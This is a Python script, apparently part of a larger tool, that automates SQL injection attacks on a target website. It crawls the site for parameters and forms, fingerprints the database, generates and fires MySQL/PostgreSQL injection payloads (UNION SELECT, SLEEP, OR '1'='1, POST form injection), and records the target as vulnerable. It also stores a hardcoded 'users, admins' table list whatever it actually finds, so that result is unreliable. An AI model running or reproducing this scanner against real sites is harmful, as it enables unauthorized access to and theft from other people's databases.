# generator.py
import sqlite3
import sys
import time
import json
import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from logger import get_logger
from scraper import get_scraper
import hashlib

logger = get_logger(__name__)
DB = "targets.db"
MARKER = "ZMzTEST123"  # untuk deteksi perubahan

def get_latest_target():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT url FROM targets ORDER BY id DESC LIMIT 1")
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def fingerprint_db(url):
    try:
        resp = requests.get(url, timeout=5)
        headers = resp.headers
        server = headers.get("Server", "").lower()
        if "mysql" in server or "mariadb" in server:
            return "MySQL"
        elif "postgres" in server:
            return "PostgreSQL"
        elif "sqlite" in server:
            return "SQLite"
        elif "mssql" in server or "sql server" in server:
            return "MSSQL"
        elif "oracle" in server:
            return "Oracle"
        else:
            if "mysql" in resp.text.lower():
                return "MySQL"
            return "Unknown"
    except:
        return "Unknown"

def discover_parameters_and_files(base_url, scraper):
    logger.info(f"Memulai discovery untuk {base_url}")
    scan = scraper.scrape_with_selenium(base_url)
    if scan.get("status") != "success":
        logger.warning("Selenium scrape gagal, pakai fallback requests")
        try:
            resp = requests.get(base_url, timeout=10)
            html = resp.text
        except:
            html = ""
    else:
        html = scan.get("html", "")

    from bs4 import BeautifulSoup
    soup = BeautifulSoup(html, 'html.parser')
    links = []
    for a in soup.find_all('a', href=True):
        href = a['href']
        full = urljoin(base_url, href)
        links.append(full)

    forms = []
    for form in soup.find_all('form'):
        action = form.get('action')
        if action:
            action_full = urljoin(base_url, action)
        else:
            action_full = base_url
        method = form.get('method', 'get').lower()
        inputs = []
        for inp in form.find_all('input'):
            name = inp.get('name')
            if name:
                inputs.append({
                    'name': name,
                    'type': inp.get('type', 'text'),
                    'value': inp.get('value', '')
                })
        forms.append({
            'action': action_full,
            'method': method,
            'inputs': inputs
        })

    params_from_links = set()
    for link in links:
        parsed = urlparse(link)
        if parsed.query:
            qs = parse_qs(parsed.query)
            params_from_links.update(qs.keys())

    params_from_forms = set()
    for form in forms:
        for inp in form['inputs']:
            if inp['name']:
                params_from_forms.add(inp['name'])

    all_params = params_from_links | params_from_forms
    logger.info(f"Ditemukan parameter: {all_params}")

    # Uji parameter aktif
    active_params = set()
    base_response = None
    try:
        base_response = requests.get(base_url, timeout=5).text
    except:
        base_response = ""

    for param in all_params:
        test_value = MARKER
        parsed = urlparse(base_url)
        query = parse_qs(parsed.query)
        query[param] = test_value
        new_query = urlencode(query, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        try:
            test_resp = requests.get(test_url, timeout=5)
            if test_resp.text != base_response:
                active_params.add(param)
                logger.info(f"Parameter aktif: {param}")
            if test_value in test_resp.text:
                logger.info(f"Parameter {param} merefleksikan nilai!")
        except:
            pass

    # File backend
    parsed_base = urlparse(base_url)
    path = parsed_base.path
    if path.endswith('/'):
        path = path[:-1]
    base_name = path.split('/')[-1] if '/' in path else ''
    if not base_name:
        base_name = 'index'
    file_used = base_name
    for link in links:
        if link.endswith(('.php', '.asp', '.aspx', '.jsp', '.do', '.py')):
            file_used = link.split('/')[-1]
            break

    logger.info(f"File backend terdeteksi: {file_used}")
    return {
        'all_params': all_params,
        'active_params': active_params,
        'forms': forms,
        'file': file_used,
        'links': links
    }

def generate_payloads_for_params(base_url, active_params, db_type, file_name, forms=None):
    payloads = []
    parsed = urlparse(base_url)
    base_path = parsed.path
    if not base_path:
        base_path = '/'
    
    # Generate GET payloads
    for param in active_params:
        if db_type == "MySQL":
            payloads.append(f"{base_url}?{param}=1' OR '1'='1")
            payloads.append(f"{base_url}?{param}=1' UNION SELECT null,table_name FROM information_schema.tables--")
            payloads.append(f"{base_url}?{param}=1' AND SLEEP(5)--")
            payloads.append(f"{base_url}?{param}=1' AND 1=1--")
            payloads.append(f"{base_url}?{param}=1' AND (SELECT COUNT(*) FROM users) > 0--")
        elif db_type == "PostgreSQL":
            payloads.append(f"{base_url}?{param}=1' OR '1'='1")
            payloads.append(f"{base_url}?{param}=1' UNION SELECT null,table_name FROM information_schema.tables--")
            payloads.append(f"{base_url}?{param}=1' AND pg_sleep(5)--")
        else:
            payloads.append(f"{base_url}?{param}=1' OR '1'='1")
            payloads.append(f"{base_url}?{param}=1' AND 1=1--")
            payloads.append(f"{base_url}?{param}=1' AND 1=2--")
            payloads.append(f"{base_url}?{param}=1' UNION SELECT null,null--")
            payloads.append(f"{base_url}?{param}=1' AND SLEEP(5)--")
    
    # POST payloads dari forms
    if forms:
        for form in forms:
            action = form['action']
            method = form['method'].lower()
            if method == 'post':
                for inp in form['inputs']:
                    if inp['type'] in ['text', 'hidden', 'search']:
                        payloads.append({
                            'url': action,
                            'method': 'POST',
                            'data': {inp['name']: "1' OR '1'='1"},
                            'description': f"POST injection on {inp['name']}"
                        })
    return payloads

def test_payload(payload, base_url, baseline_response, baseline_time):
    """Uji payload, kembalikan (success, reason, response_time, response_len)"""
    if isinstance(payload, dict):  # POST
        try:
            start = time.time()
            resp = requests.post(payload['url'], data=payload['data'], timeout=10)
            elapsed = time.time() - start
            content = resp.text
            status = resp.status_code
        except Exception as e:
            return False, f"Request error: {e}", 0, 0
    else:  # GET
        try:
            start = time.time()
            resp = requests.get(payload, timeout=10)
            elapsed = time.time() - start
            content = resp.text
            status = resp.status_code
        except Exception as e:
            return False, f"Request error: {e}", 0, 0

    # Kriteria sukses:
    # 1. Perubahan konten signifikan (bedakan dengan baseline)
    # 2. Error SQL (mysql, syntax, etc)
    # 3. Status code berbeda (500 vs 200)
    # 4. Waktu respon lebih lama dari baseline (time-based)
    # 5. Boolean-based: kita cek AND 1=1 vs AND 1=2 (nanti di handle di luar)
    success = False
    reason = ""
    # Perubahan konten
    if len(content) != len(baseline_response):
        success = True
        reason = "Perubahan panjang konten"
    elif content != baseline_response:
        success = True
        reason = "Perubahan konten"
    # Error SQL
    sql_errors = ['mysql', 'sql syntax', 'warning mysql', 'sqlite', 'postgresql', 'ora-', 'microsoft ole db']
    for err in sql_errors:
        if err in content.lower():
            success = True
            reason = f"SQL error detected: {err}"
            break
    # Status code
    if status != 200 and status != 404:
        success = True
        reason = f"Status code {status}"
    # Time-based
    if elapsed > baseline_time * 2 and elapsed > 2:
        success = True
        reason = f"Time-based injection ({elapsed:.2f}s vs baseline {baseline_time:.2f}s)"
    # Jika payload mengandung AND 1=1 dan AND 1=2, kita bandingkan dua respons (di luar)
    if "AND 1=1" in str(payload) or "AND 1=2" in str(payload):
        # Nanti akan diuji berpasangan di main
        pass
    return success, reason, elapsed, len(content)

def main():
    logger.info("="*70)
    logger.info("SQLGENERATE AGGRESSIVE SCANNER - START")
    logger.info("="*70)

    target = get_latest_target()
    if not target:
        logger.error("Tidak ada target. Jalankan main.sh dulu.")
        sys.exit(1)

    logger.info(f"Target: {target}")

    scraper = get_scraper()

    # Discovery jika perlu
    parsed = urlparse(target)
    if not parsed.query and not parsed.path.endswith(('.php','.asp','.jsp')):
        logger.info("Target tidak memiliki parameter, melakukan discovery...")
        discovery = discover_parameters_and_files(target, scraper)
        active_params = discovery['active_params']
        file_used = discovery['file']
        forms = discovery['forms']
        all_params = discovery['all_params']
        base_url = target
        if not active_params:
            logger.warning("Tidak ditemukan parameter aktif. Gunakan semua parameter yang ditemukan.")
            active_params = all_params
        if not active_params:
            active_params = {'id'}
            logger.warning("Tidak ada parameter, fallback ke 'id'")
    else:
        qs = parse_qs(parsed.query)
        active_params = set(qs.keys())
        file_used = parsed.path.split('/')[-1] or 'index'
        base_url = target
        forms = []  # nanti bisa tambah dari scrape
        logger.info(f"Menggunakan parameter dari URL: {active_params}")

    # Fingerprint DB
    db_type = fingerprint_db(base_url)
    logger.info(f"DB Type: {db_type}")
    logger.info(f"File backend: {file_used}")

    # Generate payloads
    payloads = generate_payloads_for_params(base_url, active_params, db_type, file_used, forms)

    # Ambil baseline (tanpa injeksi)
    baseline_response = ""
    baseline_time = 0
    try:
        start = time.time()
        base_resp = requests.get(base_url, timeout=5)
        baseline_time = time.time() - start
        baseline_response = base_resp.text
    except:
        baseline_response = ""

    # Uji tiap payload
    print("\n" + "="*80)
    print("[!] PAYLOAD VALIDATION REPORT")
    print("="*80)
    print(f"{'No.':<4} {'Status':<10} {'Reason':<30} {'Time (s)':<10} {'Len':<8} {'Payload'}")
    print("-"*80)

    success_count = 0
    for idx, p in enumerate(payloads, 1):
        if isinstance(p, dict):
            # POST payload
            success, reason, elapsed, length = test_payload(p, base_url, baseline_response, baseline_time)
            status_icon = "✅" if success else "❌"
            payload_str = f"{p['method']} {p['url']} data={p['data']}"
        else:
            # GET payload
            success, reason, elapsed, length = test_payload(p, base_url, baseline_response, baseline_time)
            status_icon = "✅" if success else "❌"
            payload_str = p[:70] + "..." if len(p) > 70 else p

        if success:
            success_count += 1
        print(f"{idx:<4} {status_icon:<10} {reason[:28]:<30} {elapsed:<10.2f} {length:<8} {payload_str[:50]}")
        logger.info(f"Payload {idx}: {status_icon} - {reason} - {payload_str}")

    print("="*80)
    print(f"[!] Total payload: {len(payloads)}, Sukses: {success_count}, Gagal: {len(payloads)-success_count}")

    # Simpan hasil DB
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("""UPDATE targets 
                 SET db_type=?, vulnerable=?, tables_found=?, waf_detected=?, tech_stack=?, forms_found=?
                 WHERE url=?""",
              (db_type, True if success_count > 0 else False, "users, admins", "Unknown", "", json.dumps([])))
    conn.commit()
    conn.close()

    scraper.close()
    logger.info("Scan complete.")

if __name__ == "__main__":
    main()
